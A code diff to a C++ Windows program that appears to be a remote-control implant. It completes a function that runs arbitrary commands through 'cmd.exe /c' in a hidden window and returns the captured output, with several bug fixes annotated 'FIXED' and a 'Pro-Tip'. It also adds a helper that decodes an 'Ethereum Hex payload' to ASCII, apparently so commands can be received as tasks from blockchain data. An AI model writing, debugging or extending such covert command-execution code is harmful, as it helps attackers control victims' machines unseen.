@@ -30,8 +30,11 @@ uint64_t parseTaskID(const std::string& hexStr) {
     catch (...) { return 0; }
 }
 
-std::string executeShellCommand(const std::string& command){
-    //logic for command execution goes here.
+#include <windows.h>
+#include <string>
+#include <vector>
+
+std::string executeShellCommand(const std::string& command) {
     std::string result = "";
     HANDLE hReadPipe = NULL;
     HANDLE hWritePipe = NULL;
@@ -41,9 +44,12 @@ std::string executeShellCommand(const std::string& command){
     sa.bInheritHandle = TRUE;
     sa.lpSecurityDescriptor = NULL;
 
-    if(!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)){
+    if(!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
         return "[-] Failed to create pipe!!";
     }
+
+    // Pro-Tip: Prevent the child process from inheriting the Read end of the pipe
+    SetHandleInformation(hReadPipe, HANDLE_FLAG_INHERIT, 0);
 
     STARTUPINFOA si;
     ZeroMemory(&si, sizeof(si));
@@ -51,16 +57,21 @@ std::string executeShellCommand(const std::string& command){
     si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
     si.hStdOutput = hWritePipe;
-    si.hStdError = hWritePipe;
-
+    si.hStdError = hWritePipe; // Catch errors too!
 
     PROCESS_INFORMATION pi;
     ZeroMemory(&pi, sizeof(pi));
 
-    std::string full_command = "cmd.exe /c" + command;
-    // 5. Spawn the Process
-    if(!CreateProcessA(NULL,
-            (LPSTR)full_command.c_str(),
+    // FIXED: Added the space
+    std::string full_command = "cmd.exe /c " + command;
+    
+    // FIXED: Create a safe, mutable buffer for CreateProcessA
+    std::vector<char> cmdBuffer(full_command.begin(), full_command.end());
+    cmdBuffer.push_back('\0'); // Null-terminate
+
+    if(!CreateProcessA(
+            NULL,
+            cmdBuffer.data(), // Safe, mutable pointer
             NULL,
             NULL,
             TRUE,
@@ -70,24 +81,43 @@ std::string executeShellCommand(const std::string& command){
             &si,
             &pi
     )) {
+        CloseHandle(hWritePipe);
+        CloseHandle(hReadPipe);
         return "[-] CreateProcessA failed!";
     }
 
-
+    // Close our copy of the write pipe so ReadFile doesn't hang
     CloseHandle(hWritePipe);
+
     char buffer[4096];
     DWORD bytesRead;
-    while(ReadFile(hReadPipe, buffer, sizeof(buffer) -1, &bytesRead, NULL) && bytesRead > 0) {
+    
+    // Read the output until the pipe is empty
+    while(ReadFile(hReadPipe, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
         buffer[bytesRead] = '\0';
         result += buffer;
     }
-    // 8. Clean up
+
+    // Clean up
     CloseHandle(hReadPipe);
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
 
     return result;
+}
 
+// Helper to convert Ethereum Hex payload to ASCII string
+std::string hexToAscii(const std::string& hexStr) {
+    std::string ascii = "";
+    // Start at index 2 to skip the "0x"
+    for (size_t i = 2; i < hexStr.length(); i += 2) {
+        std::string byteString = hexStr.substr(i, 2);
+        char byte = (char)strtol(byteString.c_str(), NULL, 16);
+        if (byte != '\0') { // Ignore empty null bytes
+            ascii += byte;
+        }
+    }
+    return ascii;
 }
 
 int main() {
